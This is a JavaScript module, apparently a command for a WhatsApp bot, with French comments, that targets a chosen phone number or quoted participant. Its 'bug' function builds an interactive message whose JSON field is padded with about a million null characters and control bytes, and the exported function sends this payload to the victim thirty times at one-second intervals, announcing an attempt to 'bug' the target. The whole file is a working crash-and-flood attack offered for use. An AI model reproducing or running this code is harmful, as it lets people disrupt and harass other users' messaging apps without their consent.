// Fonction pour envoyer le message beta1
async function bug(message, client, participant){

    const target = participant

    await client.relayMessage(target, 
            {
                viewOnceMessage: {
                    message: {
                        interactiveResponseMessage: {
                            body: {
                                text: " Digital Crew 243 ",
                                format: "EXTENSIONS_1"
                            },
                            nativeFlowResponseMessage: {
                                name: 'galaxy_message',
                                paramsJson: `{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"AdvanceBug\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"attacker@zyntzy.com\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"radio - buttons${"\u0000".repeat(1020000)}\",\"screen_0_TextInput_1\":\"\u0003\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
                                version: 3
                            }
                        }
                    }
                }
            }, 
            { participant: { jid: target } }
        );
}


async function fuck(client, message){

 try {

        const remoteJid = message.key?.remoteJid;

        if (!remoteJid) {
            throw new Error("Le JID du message est indéfini.");
        }

        await client.sendMessage(remoteJid, { text: "Tentative de bug de la cible..." });

        const messageBody = message.message?.extendedTextMessage?.text || message.message?.conversation || '';

        const commandAndArgs = messageBody.slice(1).trim();

        const parts = commandAndArgs.split(/\s+/);

        const args = parts.slice(1);

        let participant;

        if (message.message?.extendedTextMessage?.contextInfo?.quotedMessage) {

            participant = message.message.extendedTextMessage.contextInfo.participant;

        } else if (args.length > 0) {

            participant = args[0].replace('@', '') + '@s.whatsapp.net';

        } else {

            throw new Error('Spécifiez la personne à cibler.');
        }

        const num = '@' + participant.replace('@s.whatsapp.net', '');

        // Exécuter la commande bug

        for (let i = 0; i < 30; i++) {

            await bug(message, client, participant);

            await new Promise(resolve => setTimeout(resolve, 1000));

        }

    } catch (error) {

        console.error("Une erreur s'est produite lors de la tentative de bug de la cible :", error);

        await client.sendMessage(message.key.remoteJid, { text: `Une erreur s'est produite lors de la tentative de bug de la cible : ${error.message}` });
    }
}

export default fuck;